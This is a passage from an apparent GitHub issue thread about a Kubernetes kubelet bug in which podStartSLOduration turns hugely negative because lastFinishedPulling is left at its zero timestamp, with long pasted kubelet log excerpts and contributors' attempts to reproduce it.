watchObservedRunningTime=\"2025-03-03 22:05:04.347543049 +0800 CST m=+1370.846060030\"\nI0303 22:05:06.345775 1003926 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-6f5d8d9765-vgzxb\" podStartSLOduration=0.936493168 podStartE2EDuration=\"17.345766967s\" podCreationTimestamp=\"2025-03-03 22:04:49 +0800 CST\" firstStartedPulling=\"2025-03-03 22:04:49.648327167 +0800 CST m=+1356.146844148\" lastFinishedPulling=\"2025-03-03 22:05:06.057600967 +0800 CST m=+1372.556117947\" observedRunningTime=\"2025-03-03 22:05:06.345767383 +0800 CST m=+1372.844284364\" watchObservedRunningTime=\"2025-03-03 22:05:06.345766967 +0800 CST m=+1372.844283947\"\nI0303 22:05:06.345921 1003926 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-6f5d8d9765-qbtd9\" podStartSLOduration=2.008485751 podStartE2EDuration=\"17.345918133s\" podCreationTimestamp=\"2025-03-03 22:04:49 +0800 CST\" firstStartedPulling=\"2025-03-03 22:04:49.646091792 +0800 CST m=+1356.144608731\" lastFinishedPulling=\"2025-03-03 22:05:04.983524091 +0800 CST m=+1371.482041113\" observedRunningTime=\"2025-03-03 22:05:05.344043091 +0800 CST m=+1371.842560072\" watchObservedRunningTime=\"2025-03-03 22:05:06.345918133 +0800 CST m=+1372.844435072\"\nI0303 22:05:07.349917 1003926 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-6f5d8d9765-wpkvz\" podStartSLOduration=0.915956292 podStartE2EDuration=\"18.349908634s\" podCreationTimestamp=\"2025-03-03 22:04:49 +0800 CST\" firstStartedPulling=\"2025-03-03 22:04:49.65136175 +0800 CST m=+1356.149878731\" lastFinishedPulling=\"2025-03-03 22:05:07.085314092 +0800 CST m=+1373.583831073\" observedRunningTime=\"2025-03-03 22:05:07.349804342 +0800 CST m=+1373.848321281\" watchObservedRunningTime=\"2025-03-03 22:05:07.349908634 +0800 CST m=+1373.848425614\"\nI0303 22:05:09.351929 1003926 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-6f5d8d9765-vts58\" podStartSLOduration=1.836934042 podStartE2EDuration=\"20.351920176s\" podCreationTimestamp=\"2025-03-03 22:04:49 +0800 CST\" firstStartedPulling=\"2025-03-03 22:04:49.652733542 +0800 CST m=+1356.151250481\" lastFinishedPulling=\"2025-03-03 22:05:08.167719634 +0800 CST m=+1374.666236615\" observedRunningTime=\"2025-03-03 22:05:08.349977093 +0800 CST m=+1374.848494073\" watchObservedRunningTime=\"2025-03-03 22:05:09.351920176 +0800 CST m=+1375.850437157\"\nI0303 22:05:11.360539 1003926 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-6f5d8d9765-28jcl\" podStartSLOduration=2.799674876 podStartE2EDuration=\"22.360529802s\" podCreationTimestamp=\"2025-03-03 22:04:49 +0800 CST\" firstStartedPulling=\"2025-03-03 22:04:49.65439175 +0800 CST m=+1356.152908689\" lastFinishedPulling=\"2025-03-03 22:05:09.215246635 +0800 CST m=+1375.713763615\" observedRunningTime=\"2025-03-03 22:05:09.352161218 +0800 CST m=+1375.850678157\" watchObservedRunningTime=\"2025-03-03 22:05:11.360529802 +0800 CST m=+1377.859046783\"\nI0303 22:05:12.371974 1003926 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-6f5d8d9765-5l8fp\" podStartSLOduration=2.645544918 podStartE2EDuration=\"23.37195297s\" podCreationTimestamp=\"2025-03-03 22:04:49 +0800 CST\" firstStartedPulling=\"2025-03-03 22:04:49.655235834 +0800 CST m=+1356.153752814\" lastFinishedPulling=\"2025-03-03 22:05:10.381643885 +0800 CST m=+1376.880160866\" observedRunningTime=\"2025-03-03 22:05:11.360780469 +0800 CST m=+1377.859297408\" watchObservedRunningTime=\"2025-03-03 22:05:12.37195297 +0800 CST m=+1378.870469950\"\nI0303 22:05:13.378604 1003926 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-6f5d8d9765-lttf9\" podStartSLOduration=2.669807376 podStartE2EDuration=\"24.378585345s\" podCreationTimestamp=\"2025-03-03 22:04:49 +0800 CST\" firstStartedPulling=\"2025-03-03 22:04:49.676987625 +0800 CST m=+1356.175504564\" lastFinishedPulling=\"2025-03-03 22:05:11.385765552 +0800 CST m=+1377.884282533\" observedRunningTime=\"2025-03-03 22:05:12.37324922 +0800 CST m=+1378.871766159\" watchObservedRunningTime=\"2025-03-03 22:05:13.378585345 +0800 CST m=+1379.877102367\"\nI0303 22:05:14.386137 1003926 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-6f5d8d9765-79tk8\" podStartSLOduration=2.62329521 podStartE2EDuration=\"25.386119762s\" podCreationTimestamp=\"2025-03-03 22:04:49 +0800 CST\" firstStartedPulling=\"2025-03-03 22:04:49.678997334 +0800 CST m=+1356.177514273\" lastFinishedPulling=\"2025-03-03 22:05:12.441821803 +0800 CST m=+1378.940338825\" observedRunningTime=\"2025-03-03 22:05:13.37881347 +0800 CST m=+1379.877330451\" watchObservedRunningTime=\"2025-03-03 22:05:14.386119762 +0800 CST m=+1380.884636743\"\nI0303 22:05:15.387706 1003926 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-6f5d8d9765-j54mq\" podStartSLOduration=2.499969376 podStartE2EDuration=\"26.387692346s\" podCreationTimestamp=\"2025-03-03 22:04:49 +0800 CST\" firstStartedPulling=\"2025-03-03 22:04:49.679041209 +0800 CST m=+1356.177558189\" lastFinishedPulling=\"2025-03-03 22:05:13.56676422 +0800 CST m=+1380.065281159\" observedRunningTime=\"2025-03-03 22:05:14.38955047 +0800 CST m=+1380.888067451\" watchObservedRunningTime=\"2025-03-03 22:05:15.387692346 +0800 CST m=+1381.886209327\"\nI0303 22:05:16.392929 1003926 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-6f5d8d9765-lhxks\" podStartSLOduration=2.417404084 podStartE2EDuration=\"27.392913096s\" podCreationTimestamp=\"2025-03-03 22:04:49 +0800 CST\" firstStartedPulling=\"2025-03-03 22:04:49.67904525 +0800 CST m=+1356.177562189\" lastFinishedPulling=\"2025-03-03 22:05:14.654554262 +0800 CST m=+1381.153071201\" observedRunningTime=\"2025-03-03 22:05:15.388080221 +0800 CST m=+1381.886597202\" watchObservedRunningTime=\"2025-03-03 22:05:16.392913096 +0800 CST m=+1382.891430077\"\nI0303 22:05:17.405627 1003926 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-6f5d8d9765-mklsx\" podStartSLOduration=1.350270126 podStartE2EDuration=\"28.40561718s\" podCreationTimestamp=\"2025-03-03 22:04:49 +0800 CST\" firstStartedPulling=\"2025-03-03 22:04:49.680459084 +0800 CST m=+1356.178976023\" lastFinishedPulling=\"2025-03-03 22:05:16.735806097 +0800 CST m=+1383.234323077\" observedRunningTime=\"2025-03-03 22:05:17.405475555 +0800 CST m=+1383.903992536\" watchObservedRunningTime=\"2025-03-03 22:05:17.40561718 +0800 CST m=+1383.904134119\"\nI0303 22:05:17.405737 1003926 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-6f5d8d9765-jvn6p\" podStartSLOduration=2.348157626 podStartE2EDuration=\"28.40573143s\" podCreationTimestamp=\"2025-03-03 22:04:49 +0800 CST\" firstStartedPulling=\"2025-03-03 22:04:49.679048 +0800 CST m=+1356.177564939\" lastFinishedPulling=\"2025-03-03 22:05:15.736621763 +0800 CST m=+1382.235138743\" observedRunningTime=\"2025-03-03 22:05:16.39603993 +0800 CST m=+1382.894556869\" watchObservedRunningTime=\"2025-03-03 22:05:17.40573143 +0800 CST m=+1383.904248411\"\nI0303 22:05:18.408043 1003926 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-6f5d8d9765-g2v42\" podStartSLOduration=1.270441833 podStartE2EDuration=\"29.408033722s\" podCreationTimestamp=\"2025-03-03 22:04:49 +0800 CST\" firstStartedPulling=\"2025-03-03 22:04:49.680477834 +0800 CST m=+1356.178994814\" lastFinishedPulling=\"2025-03-03 22:05:17.818069722 +0800 CST m=+1384.316586703\" observedRunningTime=\"2025-03-03 22:05:18.407502347 +0800 CST m=+1384.906019328\" watchObservedRunningTime=\"2025-03-03 22:05:18.408033722 +0800 CST m=+1384.906550661\"\n```\n\n</details>"}, {"author": "SergeyKanzhelev", "body": "/assign @esotsal \n/triage accepted\n/priority important-longterm"}, {"author": "esotsal", "body": "[Update]\n\nUsed same deployment removing nodeSelector, starting 100 instances using local-up-cluster, i could not reproduce the issue. \n\nVariable lastFinishedPulling, is set to \"0001-01-01 00:00:00 +0000 UTC\" resulting later to a negative podStartSLOduration.\n\nhttps://github.com/kubernetes/kubernetes/blob/c30b1eb09b6355f88ac514ec97cb7d87bdf6c2c3/pkg/kubelet/util/pod_startup_latency_tracker.go#L99-L102\n\nstate.lastFinishedPulling is set inside RecordImageFinishedPulling method\n\nhttps://github.com/kubernetes/kubernetes/blob/7c78041218a4cf0b183dc0dab71f475a5db667bf/pkg/kubelet/util/pod_startup_latency_tracker.go#L140-L150\n\n\nContinuing troubleshooting to see if i will be able to reproduce it. "}, {"author": "esotsal", "body": "Hi,\n\nI was not able to reproduce the issue even when I applied a network throttling in my lab to emulate network glitches.\n\nChecking the provided logs I notice that when the issue first appeared there is a gap in provided logs of 9 seconds ( Feb 25 21:38:56 aks-userpool0-20459031-vmss000001 \u2026. Next log entry Feb 25 21:39:05 ) it would be helpful to understand why this gap exists in the first place.\n\nIf you can reproduce the issue on a local cluster and provide more datapoints would be helpful, as it is know I agree with @HirazawaUi conclusion.\n\n@alyssa1303 setting this issue to needs more information from author "}, {"author": "alyssa1303", "body": "Hi @esotsal! Sorry for the late response. I tried with k8s 1.32 and still see the same error. Can you confirm that you actually deploy 100 pods in a single node instead of spreading across multiple nodes? It's easier to reproduce when there's a burst of pods in a node. Also, can you check if you enable parallel pull image on your kubelet settings? I suspect it might be related. \n\n```\ncat messages.log | grep \"Observed pod startup duration\"\nMar 21 03:13:19 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:19.200417    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-5pd85\" podStartSLOduration=1.921952685 podStartE2EDuration=\"4.200398001s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.614289509 +0000 UTC m=+1029.953143114\" lastFinishedPulling=\"2025-03-21 03:13:17.892734825 +0000 UTC m=+1032.231588430\" observedRunningTime=\"2025-03-21 03:13:19.198266281 +0000 UTC m=+1033.537119886\" watchObservedRunningTime=\"2025-03-21 03:13:19.200398001 +0000 UTC m=+1033.539251706\"\nMar 21 03:13:19 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:19.429672    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-h8vh9\" podStartSLOduration=2.125523881 podStartE2EDuration=\"4.429652436s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.625955417 +0000 UTC m=+1029.964809022\" lastFinishedPulling=\"2025-03-21 03:13:17.930083972 +0000 UTC m=+1032.268937577\" observedRunningTime=\"2025-03-21 03:13:19.389486162 +0000 UTC m=+1033.728339767\" watchObservedRunningTime=\"2025-03-21 03:13:19.429652436 +0000 UTC m=+1033.768506141\"\nMar 21 03:13:19 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:19.991735    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-5cwcb\" podStartSLOduration=3.650732082 podStartE2EDuration=\"4.991716869s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.6013717 +0000 UTC m=+1030.940225305\" lastFinishedPulling=\"2025-03-21 03:13:17.942356487 +0000 UTC m=+1032.281210092\" observedRunningTime=\"2025-03-21 03:13:19.951776297 +0000 UTC m=+1034.290629902\" watchObservedRunningTime=\"2025-03-21 03:13:19.991716869 +0000 UTC m=+1034.330570474\"\nMar 21 03:13:20 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:20.233927    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-lg9rb\" podStartSLOduration=3.090380365 podStartE2EDuration=\"5.233907624s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.798695326 +0000 UTC m=+1030.137548931\" lastFinishedPulling=\"2025-03-21 03:13:17.942222485 +0000 UTC m=+1032.281076190\" observedRunningTime=\"2025-03-21 03:13:20.228646175 +0000 UTC m=+1034.567499780\" watchObservedRunningTime=\"2025-03-21 03:13:20.233907624 +0000 UTC m=+1034.572761229\"\nMar 21 03:13:20 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:20.351833    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-c9w59\" podStartSLOduration=3.062492705 podStartE2EDuration=\"5.351815822s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.613240499 +0000 UTC m=+1029.952094104\" lastFinishedPulling=\"2025-03-21 03:13:17.902563616 +0000 UTC m=+1032.241417221\" observedRunningTime=\"2025-03-21 03:13:20.349743403 +0000 UTC m=+1034.688597008\" watchObservedRunningTime=\"2025-03-21 03:13:20.351815822 +0000 UTC m=+1034.690669427\"\nMar 21 03:13:20 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:20.551828    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-wj5ln\" podStartSLOduration=3.187937574 podStartE2EDuration=\"5.551810085s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.525523782 +0000 UTC m=+1029.864377387\" lastFinishedPulling=\"2025-03-21 03:13:17.889396193 +0000 UTC m=+1032.228249898\" observedRunningTime=\"2025-03-21 03:13:20.550623774 +0000 UTC m=+1034.889477379\" watchObservedRunningTime=\"2025-03-21 03:13:20.551810085 +0000 UTC m=+1034.890663790\"\nMar 21 03:13:20 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:20.672216    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-59rsp\" podStartSLOduration=3.365224125 podStartE2EDuration=\"5.672200406s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.6133122 +0000 UTC m=+1029.952165805\" lastFinishedPulling=\"2025-03-21 03:13:17.920288481 +0000 UTC m=+1032.259142086\" observedRunningTime=\"2025-03-21 03:13:20.670663691 +0000 UTC m=+1035.009517296\" watchObservedRunningTime=\"2025-03-21 03:13:20.672200406 +0000 UTC m=+1035.011054111\"\nMar 21 03:13:21 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:21.271416    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-2jzht\" podStartSLOduration=3.94499224 podStartE2EDuration=\"6.271398602s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.591947101 +0000 UTC m=+1029.930800706\" lastFinishedPulling=\"2025-03-21 03:13:17.918353463 +0000 UTC m=+1032.257207068\" observedRunningTime=\"2025-03-21 03:13:21.270637095 +0000 UTC m=+1035.609490800\" watchObservedRunningTime=\"2025-03-21 03:13:21.271398602 +0000 UTC m=+1035.610252207\"\nMar 21 03:13:21 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:21.351041    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-vtttc\" podStartSLOduration=4.481177757 podStartE2EDuration=\"6.351023368s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.063474491 +0000 UTC m=+1030.402328096\" lastFinishedPulling=\"2025-03-21 03:13:17.933320002 +0000 UTC m=+1032.272173707\" observedRunningTime=\"2025-03-21 03:13:21.310642579 +0000 UTC m=+1035.649496284\" watchObservedRunningTime=\"2025-03-21 03:13:21.351023368 +0000 UTC m=+1035.689876973\"\nMar 21 03:13:21 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:21.549030    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-qcls8\" podStartSLOduration=4.155022679 podStartE2EDuration=\"6.549009371s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.514109576 +0000 UTC m=+1029.852963181\" lastFinishedPulling=\"2025-03-21 03:13:17.908096168 +0000 UTC m=+1032.246949873\" observedRunningTime=\"2025-03-21 03:13:21.510966706 +0000 UTC m=+1035.849820311\" watchObservedRunningTime=\"2025-03-21 03:13:21.549009371 +0000 UTC m=+1035.887862976\"\nMar 21 03:13:21 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:21.631825    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-8lrp8\" podStartSLOduration=4.163397583 podStartE2EDuration=\"6.631809867s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.454167918 +0000 UTC m=+1029.793021523\" lastFinishedPulling=\"2025-03-21 03:13:17.922580202 +0000 UTC m=+1032.261433807\" observedRunningTime=\"2025-03-21 03:13:21.630153152 +0000 UTC m=+1035.969006757\" watchObservedRunningTime=\"2025-03-21 03:13:21.631809867 +0000 UTC m=+1035.970663472\"\nMar 21 03:13:21 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:21.830932    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-p4qcg\" podStartSLOduration=5.107898238 podStartE2EDuration=\"6.830913782s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.198431148 +0000 UTC m=+1030.537284853\" lastFinishedPulling=\"2025-03-21 03:13:17.921446792 +0000 UTC m=+1032.260300397\" observedRunningTime=\"2025-03-21 03:13:21.830913982 +0000 UTC m=+1036.169767587\" watchObservedRunningTime=\"2025-03-21 03:13:21.830913782 +0000 UTC m=+1036.169767487\"\nMar 21 03:13:22 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:22.232722    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-c4xrt\" podStartSLOduration=4.948797979 podStartE2EDuration=\"7.232701945s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.61440641 +0000 UTC m=+1029.953260015\" lastFinishedPulling=\"2025-03-21 03:13:17.898310376 +0000 UTC m=+1032.237163981\" observedRunningTime=\"2025-03-21 03:13:22.23109443 +0000 UTC m=+1036.569948035\" watchObservedRunningTime=\"2025-03-21 03:13:22.232701945 +0000 UTC m=+1036.571555650\"\nMar 21 03:13:22 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:22.352144    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-t9dhj\" podStartSLOduration=5.899946571 podStartE2EDuration=\"7.352127693s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.490049663 +0000 UTC m=+1030.828903268\" lastFinishedPulling=\"2025-03-21 03:13:17.942230785 +0000 UTC m=+1032.281084390\" observedRunningTime=\"2025-03-21 03:13:22.310512593 +0000 UTC m=+1036.649366198\" watchObservedRunningTime=\"2025-03-21 03:13:22.352127693 +0000 UTC m=+1036.690981298\"\nMar 21 03:13:22 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:22.752442    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-tk7wh\" podStartSLOduration=5.220587967 podStartE2EDuration=\"7.752426742s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.398234397 +0000 UTC m=+1029.737088002\" lastFinishedPulling=\"2025-03-21 03:13:17.930073172 +0000 UTC m=+1032.268926777\" observedRunningTime=\"2025-03-21 03:13:22.750387422 +0000 UTC m=+1037.089241127\" watchObservedRunningTime=\"2025-03-21 03:13:22.752426742 +0000 UTC m=+1037.091280447\"\nMar 21 03:13:23 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:23.071078    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-kmq2s\" podStartSLOduration=5.786931537 podStartE2EDuration=\"8.071062206s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.630902263 +0000 UTC m=+1029.969755868\" lastFinishedPulling=\"2025-03-21 03:13:17.915032932 +0000 UTC m=+1032.253886537\" observedRunningTime=\"2025-03-21 03:13:23.032349333 +0000 UTC m=+1037.371202938\" watchObservedRunningTime=\"2025-03-21 03:13:23.071062206 +0000 UTC m=+1037.409915911\"\nMar 21 03:13:27 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:27.723580    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-6gb4w\" podStartSLOduration=-9223372024.13121 podStartE2EDuration=\"12.723565639s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.630962464 +0000 UTC m=+1029.969816069\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:27.723191335 +0000 UTC m=+1042.062044940\" watchObservedRunningTime=\"2025-03-21 03:13:27.723565639 +0000 UTC m=+1042.062419244\"\nMar 21 03:13:27 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:27.750637    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-gwnz4\" podStartSLOduration=-9223372024.104155 podStartE2EDuration=\"12.750620799s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.192125389 +0000 UTC m=+1030.530978994\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:27.748460878 +0000 UTC m=+1042.087314483\" watchObservedRunningTime=\"2025-03-21 03:13:27.750620799 +0000 UTC m=+1042.089474404\"\nMar 21 03:13:28 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:28.727286    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-sfsl7\" podStartSLOduration=-9223372023.127499 podStartE2EDuration=\"13.72727649s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.151687013 +0000 UTC m=+1030.490540618\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:28.727073988 +0000 UTC m=+1043.065927593\" watchObservedRunningTime=\"2025-03-21 03:13:28.72727649 +0000 UTC m=+1043.066130195\"\nMar 21 03:13:28 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:28.760675    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-qmw2r\" podStartSLOduration=-9223372023.094114 podStartE2EDuration=\"13.760661511s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.296095757 +0000 UTC m=+1030.634949362\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:28.744609956 +0000 UTC m=+1043.083463661\" watchObservedRunningTime=\"2025-03-21 03:13:28.760661511 +0000 UTC m=+1043.099515116\"\nMar 21 03:13:28 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:28.761517    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-kjqhs\" podStartSLOduration=-9223372023.09327 podStartE2EDuration=\"13.761505519s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.798815227 +0000 UTC m=+1030.137668832\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:28.760719611 +0000 UTC m=+1043.099573316\" watchObservedRunningTime=\"2025-03-21 03:13:28.761505519 +0000 UTC m=+1043.100359124\"\nMar 21 03:13:28 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:28.788157    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-5nxht\" podStartSLOduration=-9223372023.066637 podStartE2EDuration=\"13.788138275s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.309484882 +0000 UTC m=+1030.648338487\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:28.78561705 +0000 UTC m=+1043.124470755\" watchObservedRunningTime=\"2025-03-21 03:13:28.788138275 +0000 UTC m=+1043.126991980\"\nMar 21 03:13:28 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:28.819529    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-jbvlq\" podStartSLOduration=-9223372023.035273 podStartE2EDuration=\"13.819503176s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.0966297 +0000 UTC m=+1030.435483305\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:28.818049162 +0000 UTC m=+1043.156902767\" watchObservedRunningTime=\"2025-03-21 03:13:28.819503176 +0000 UTC m=+1043.158356781\"\nMar 21 03:13:28 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:28.820671    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-ks84q\" podStartSLOduration=-9223372023.034124 podStartE2EDuration=\"13.820652387s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.68422976 +0000 UTC m=+1030.023083465\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:28.803965127 +0000 UTC m=+1043.142818832\" watchObservedRunningTime=\"2025-03-21 03:13:28.820652387 +0000 UTC m=+1043.159505992\"\nMar 21 03:13:28 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:28.856585    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-d6bbp\" podStartSLOduration=-9223372022.998213 podStartE2EDuration=\"13.856563033s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.218141932 +0000 UTC m=+1030.556995537\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:28.854508213 +0000 UTC m=+1043.193361918\" watchObservedRunningTime=\"2025-03-21 03:13:28.856563033 +0000 UTC m=+1043.195416638\"\nMar 21 03:13:28 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:28.857113    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-rdr4l\" podStartSLOduration=-9223372022.997679 podStartE2EDuration=\"13.857096938s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.788733133 +0000 UTC m=+1030.127586838\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:28.837400748 +0000 UTC m=+1043.176254453\" watchObservedRunningTime=\"2025-03-21 03:13:28.857096938 +0000 UTC m=+1043.195950543\"\nMar 21 03:13:28 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:28.871433    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-85z7k\" podStartSLOduration=-9223372022.983366 podStartE2EDuration=\"13.871410675s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.150755404 +0000 UTC m=+1030.489609109\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:28.86873175 +0000 UTC m=+1043.207585355\" watchObservedRunningTime=\"2025-03-21 03:13:28.871410675 +0000 UTC m=+1043.210264280\"\nMar 21 03:13:28 